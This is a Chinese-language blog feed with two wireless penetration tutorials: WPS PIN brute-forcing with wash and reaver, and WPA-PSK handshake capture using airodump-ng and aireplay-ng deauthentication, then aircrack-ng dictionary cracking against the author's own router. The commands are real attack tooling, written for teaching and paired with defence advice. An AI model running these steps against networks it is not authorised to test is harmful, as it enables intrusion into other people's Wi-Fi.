<h2 id="0x01-WPS简介"><a href="#0x01-WPS简介" class="headerlink" title="0x01. WPS简介"></a><strong>0x01. WPS简介</strong></h2><h4 id="WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。"><a href="#WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。" class="headerlink" title="WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。"></a>WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。</h4><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><h4 id="emsp-通过PIN码来简化无线接入的操作，所以我们无需记住PSK"><a href="#emsp-通过PIN码来简化无线接入的操作，所以我们无需记住PSK" class="headerlink" title="&emsp;通过PIN码来简化无线接入的操作，所以我们无需记住PSK."></a>&emsp;通过PIN码来简化无线接入的操作，所以我们无需记住PSK.</h4><h3 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h3><h4 id="emsp-PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK"><a href="#emsp-PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK" class="headerlink" title="&emsp;PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK."></a>&emsp;PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK.</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/477431D45FB048F8AD50D9C417446789/1040" alt="image"></p>
<hr>
<h2 id="0x02-WPS破解实战"><a href="#0x02-WPS破解实战" class="headerlink" title="0x02. WPS破解实战"></a>0x02. <strong>WPS破解实战</strong></h2><h4 id="emsp-emsp-由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。"><a href="#emsp-emsp-由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。" class="headerlink" title="&emsp;&emsp;由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。"></a>&emsp;&emsp;由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。</h4><h3 id="实战流程"><a href="#实战流程" class="headerlink" title="实战流程"></a>实战流程</h3><h4 id="1-关闭会影响操作的进程，启动网卡置为monitor模式"><a href="#1-关闭会影响操作的进程，启动网卡置为monitor模式" class="headerlink" title="1.关闭会影响操作的进程，启动网卡置为monitor模式"></a>1.关闭会影响操作的进程，启动网卡置为monitor模式</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/4D2DF1CDFD874562974E89F262E80A2E/1065" alt="image"></p>
<h4 id="2-侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的"><a href="#2-侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的" class="headerlink" title="2.侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的"></a>2.侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的</h4><h4 id="1-airodump-wlan0mon-wps-开启WPS的设备会显示如下"><a href="#1-airodump-wlan0mon-wps-开启WPS的设备会显示如下" class="headerlink" title="(1)airodump wlan0mon --wps   开启WPS的设备会显示如下"></a>(1)airodump wlan0mon <strong>-</strong>-wps   开启WPS的设备会显示如下</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/22302CB608DD4C53BD53B8C8E04ECCCD/1081" alt="image"></p>
<h4 id="2-wash-i-wlan0mon-采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住"><a href="#2-wash-i-wlan0mon-采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住" class="headerlink" title="(2)wash -i wlan0mon 采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住"></a>(2)wash -i wlan0mon 采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/747366BE8129447DBDF876DC3C566F5C/1086" alt="image"></p>
<h4 id="3-侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码"><a href="#3-侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码" class="headerlink" title="3.侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码"></a>3.侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码</h4><h4 id="1-利用reaver爆破密码-经过几个小时的爆破基本能猜出来"><a href="#1-利用reaver爆破密码-经过几个小时的爆破基本能猜出来" class="headerlink" title="(1)利用reaver爆破密码,经过几个小时的爆破基本能猜出来"></a>(1)利用reaver爆破密码,经过几个小时的爆破基本能猜出来</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/BB96DDDEFD6C4295BAB85DF72B562B57/1094" alt="image"></p>
<h4 id="2-利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了"><a href="#2-利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了" class="headerlink" title="(2)利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了"></a>(2)利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/A7BD48323F994067BC2F5D93D7CF99B3/1100" alt="image"></p>
<h2 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03. 防御措施"></a><strong>0x03. 防御措施</strong></h2><h4 id="emsp-emsp-经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。"><a href="#emsp-emsp-经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。" class="headerlink" title="&emsp;&emsp;经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。"></a>&emsp;&emsp;经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。</h4><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a><strong>0x04. 结语</strong></h2><h4 id="emsp-emsp-本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！"><a href="#emsp-emsp-本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！" class="headerlink" title="&emsp;&emsp;本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！"></a>&emsp;&emsp;本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[无线渗透(上)--WPA加密]]></title>
      <url>/2017/08/30/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%8A)--WPA%E5%8A%A0%E5%AF%86/</url>
      <content type="html"><![CDATA[<h2 id="0x00-无线渗透简介"><a href="#0x00-无线渗透简介" class="headerlink" title="0x00. 无线渗透简介"></a>0x00. 无线渗透简介</h2><h4 id="emsp-emsp-在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用"><a href="#emsp-emsp-在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用" class="headerlink" title="&emsp;&emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用!"></a>&emsp;&emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用!</h4><a id="more"></a>
<h2 id="0x01-协议分析"><a href="#0x01-协议分析" class="headerlink" title="0x01. 协议分析"></a><strong>0x01. 协议分析</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/9CB410665DDB4B4F98F1E69275D43BBB/699" alt="image"></p>
<h4 id="emsp-emsp-无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。-而我们的Wi-Fi就是依赖数据链路层的802-11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802-11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802-11n-下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802-11协议，以便更好理解后面内容。"><a href="#emsp-emsp-无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。-而我们的Wi-Fi就是依赖数据链路层的802-11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802-11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802-11n-下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802-11协议，以便更好理解后面内容。" class="headerlink" title="&emsp;&emsp;无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。 而我们的Wi-Fi就是依赖数据链路层的802.11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802.11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802.11n,下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802.11协议，以便更好理解后面内容。"></a>&emsp;&emsp;无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。 而我们的Wi-Fi就是依赖数据链路层的802.11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802.11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802.11n,下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下<a href="http://blog.csdn.net/cupidove/article/details/23122213" target="_blank" rel="external">详细的802.11协议</a>，以便更好理解后面内容。</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/5DD04579426246628D480168D104711B/748" alt="image"></p>
<hr>
<h2 id="0x02-WPA简介"><a href="#0x02-WPA简介" class="headerlink" title="0x02. WPA简介"></a><strong>0x02. WPA简介</strong></h2><h4 id="emsp-emsp-无线通信中WPA2是目前个人用户用得最广的加密协议，企业用的最广的是企业级WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍，WPA2的攻击过程类似。"><a href="#emsp-emsp-无线通信中WPA2是目前个人用户用得最广的加密协议，企业用的最广的是企业级WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍，WPA2的攻击过程类似。" class="headerlink" title="&emsp;&emsp;无线通信中WPA2是目前个人用户用得最广的加密协议，企业用的最广的是企业级WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍，WPA2的攻击过程类似。"></a>&emsp;&emsp;无线通信中WPA2是目前个人用户用得最广的加密协议，企业用的最广的是企业级WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍，WPA2的攻击过程类似。</h4><hr>
<h2 id="0x03-WPA密钥交换流程"><a href="#0x03-WPA密钥交换流程" class="headerlink" title="0x03. WPA密钥交换流程"></a><strong>0x03. WPA密钥交换流程</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/003B6F229A3244159C233A04F3D76503/756" alt="image"></p>
<h3 id="emsp-emsp-虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似"><a href="#emsp-emsp-虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似" class="headerlink" title="&emsp;&emsp;虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似"></a>&emsp;&emsp;虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似</h3><h4 id="emsp-emsp-1-首先由AP-可以通俗理解为Wi-Fi-发送ANonce给STATION-客户端-；"><a href="#emsp-emsp-1-首先由AP-可以通俗理解为Wi-Fi-发送ANonce给STATION-客户端-；" class="headerlink" title="&emsp;&emsp;1.首先由AP(可以通俗理解为Wi-Fi)发送ANonce给STATION(客户端)；"></a>&emsp;&emsp;1.首先由AP(可以通俗理解为Wi-Fi)发送ANonce给STATION(客户端)；</h4><h4 id="emsp-emsp-2-STA接收到ANonce之后利用正确的Essid-Wi-Fi名称-和PSK-共享密钥，即密码-经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP-MAC、STA-MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；"><a href="#emsp-emsp-2-STA接收到ANonce之后利用正确的Essid-Wi-Fi名称-和PSK-共享密钥，即密码-经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP-MAC、STA-MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；" class="headerlink" title="&emsp;&emsp;2.STA接收到ANonce之后利用正确的Essid(Wi-Fi名称)和PSK(共享密钥，即密码)经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP MAC、STA MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；"></a>&emsp;&emsp;2.STA接收到ANonce之后利用正确的Essid(Wi-Fi名称)和PSK(共享密钥，即密码)经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP MAC、STA MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；</h4><h4 id="emsp-emsp-3-AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP-MAC、STA-MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；"><a href="#emsp-emsp-3-AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP-MAC、STA-MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；" class="headerlink" title="&emsp;&emsp;3.AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP MAC、STA MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；"></a>&emsp;&emsp;3.AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP MAC、STA MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；</h4><h4 id="emsp-emsp-4-STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。"><a href="#emsp-emsp-4-STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。" class="headerlink" title="&emsp;&emsp;4.STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。"></a>&emsp;&emsp;4.STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。</h4><hr>
<h2 id="0x04-WPA-PSK攻击原理"><a href="#0x04-WPA-PSK攻击原理" class="headerlink" title="0x04. WPA PSK攻击原理"></a><strong>0x04. WPA PSK攻击原理</strong></h2><h4 id="emsp-emsp-上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。"><a href="#emsp-emsp-上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。" class="headerlink" title="&emsp;&emsp;上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。"></a>&emsp;&emsp;上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。</h4><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><h4 id="emsp-1-利用抓包工具抓取四步握手过程；"><a href="#emsp-1-利用抓包工具抓取四步握手过程；" class="headerlink" title="&emsp;1.利用抓包工具抓取四步握手过程；"></a>&emsp;1.利用抓包工具抓取四步握手过程；</h4><h4 id="emsp-2-抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP-MAC、STA-MAC、MIC-因为PMK-Essid-PSK-迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK-MIC值-PTK-MIC-ANonce-SNonce-PMK-AP-MAC-STA-MAC-散列计算-比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。"><a href="#emsp-2-抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP-MAC、STA-MAC、MIC-因为PMK-Essid-PSK-迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK-MIC值-PTK-MIC-ANonce-SNonce-PMK-AP-MAC-STA-MAC-散列计算-比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。" class="headerlink" title="&emsp;2.抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP MAC、STA MAC、MIC,因为PMK=Essid + PSK + 迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK MIC值(PTK MIC = ANonce + SNonce + PMK + AP MAC + STA MAC + 散列计算)比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。"></a>&emsp;2.抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP MAC、STA MAC、MIC,因为PMK=Essid + PSK + 迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK MIC值(PTK MIC = ANonce + SNonce + PMK + AP MAC + STA MAC + 散列计算)比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。</h4><hr>
<h2 id="0x05-WPA攻击实战"><a href="#0x05-WPA攻击实战" class="headerlink" title="0x05. WPA攻击实战"></a><strong>0x05. WPA攻击实战</strong></h2><h4 id="emsp-emsp-介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。"><a href="#emsp-emsp-介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。" class="headerlink" title="&emsp;&emsp;介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。"></a>&emsp;&emsp;介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-1-kali-Linux虚拟机"><a href="#emsp-1-kali-Linux虚拟机" class="headerlink" title="&emsp;1.kali Linux虚拟机"></a>&emsp;1.kali Linux虚拟机</h4><h4 id="emsp-2-TL-WN722N网卡"><a href="#emsp-2-TL-WN722N网卡" class="headerlink" title="&emsp;2.TL-WN722N网卡"></a>&emsp;2.TL-WN722N网卡</h4><h4 id="emsp-3-Wi-Fi密码为admin123的路由器"><a href="#emsp-3-Wi-Fi密码为admin123的路由器" class="headerlink" title="&emsp;3.Wi-Fi密码为admin123的路由器"></a>&emsp;3.Wi-Fi密码为admin123的路由器</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/63067782993749B08166DC5D3FE8BEA2/883" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/135817F3256741E6A946E1B9706C27AD/913" alt="image"></p>
<h3 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h3><h4 id="emsp-1-启动kali-Linux虚拟机，映射网卡"><a href="#emsp-1-启动kali-Linux虚拟机，映射网卡" class="headerlink" title="&emsp;1.启动kali Linux虚拟机，映射网卡"></a>&emsp;1.启动kali Linux虚拟机，映射网卡</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/F2E877559EA14CD9A3D22AF94B5DE207/891" alt="image"></p>
<h4 id="emsp-2-启动网卡，设置为monitor模式"><a href="#emsp-2-启动网卡，设置为monitor模式" class="headerlink" title="&emsp;2.启动网卡，设置为monitor模式"></a>&emsp;2.启动网卡，设置为monitor模式</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/95502CABB90F4DF79FA602AE292801C9/909" alt="image"></p>
<h4 id="emsp-3-启动airodump-ng进行抓包侦听-airodump-ng-interface-c-channel-essid-essid-name-w-wpa"><a href="#emsp-3-启动airodump-ng进行抓包侦听-airodump-ng-interface-c-channel-essid-essid-name-w-wpa" class="headerlink" title="&emsp;3.启动airodump-ng进行抓包侦听(airodump-ng [interface] -c [channel] --essid [essid name] -w wpa)"></a>&emsp;3.启动airodump-ng进行抓包侦听(airodump-ng [interface] -c [channel] <strong>-</strong>-essid [essid name] -w wpa)</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/7DC28669142B44EEBFB4F75AD6887744/918" alt="image"></p>
<h4 id="emsp-4-利用aireplay-ng-aireplay-0-3-a-AP-MAC-c-STA-MAC-interface-emsp-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手"><a href="#emsp-4-利用aireplay-ng-aireplay-0-3-a-AP-MAC-c-STA-MAC-interface-emsp-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手" class="headerlink" title="&emsp;4.利用aireplay-ng(aireplay -0 3 -a [AP MAC] -c [STA MAC] [interface] &emsp;迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手"></a>&emsp;4.利用aireplay-ng(aireplay -0 3 -a [AP MAC] -c [STA MAC] [interface] &emsp;迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/1AF5BBD248E54CB8AB60B5D4F144D421/926" alt="image"></p>
<h4 id="emsp-5-调用aircrack-ng破解密码-aircrack-ng-w-wordlist-txt-wpa-01-cap"><a href="#emsp-5-调用aircrack-ng破解密码-aircrack-ng-w-wordlist-txt-wpa-01-cap" class="headerlink" title="&emsp;5.调用aircrack-ng破解密码(aircrack-ng -w [wordlist.txt] wpa-01.cap)"></a>&emsp;5.调用aircrack-ng破解密码(aircrack-ng -w [wordlist.txt] wpa-01.cap)</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/3391248596AF4F8A923ADDE0CE28F2E4/936" alt="image"></p>
<hr>
